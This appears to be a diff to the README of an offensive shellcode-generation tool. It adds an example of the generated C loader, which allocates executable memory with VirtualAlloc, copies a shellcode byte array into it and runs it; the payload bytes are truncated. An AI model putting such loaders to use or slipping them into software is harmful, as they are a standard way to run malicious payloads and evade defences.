@@ -26,13 +26,14 @@ Shellcode generated will also automatically be passed into a loader template, lo
 * [shellcode.h](./templates/shellcode_h.py)
   * The shellcode header template, this is where the shellcode will be defined.
 
+## Example
 main.c
 ```c
 #include <windows.h>
 #include "shellcode.h"
 
 int main(int argc, char *argv[]) {
-    size_t shellcode_size = [~SHELLCODE_SIZE~];
+    size_t shellcode_size = 42965; // auto-generated based on size of bin
     void *exec = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(exec, shellcode, shellcode_size);
     ((void(*)())exec)();
@@ -42,9 +43,7 @@ int main(int argc, char *argv[]) {
 
 shellcode.c
 ```c
-unsigned char shellcode[] = {
-    [~SHELLCODE~]
-};
+unsigned char shellcode[] = { 0xE8, 0xC0, 0x45, 0x00, 0x00, 0xC0, 0x45 ... };
 ```
 
 shellcode.h
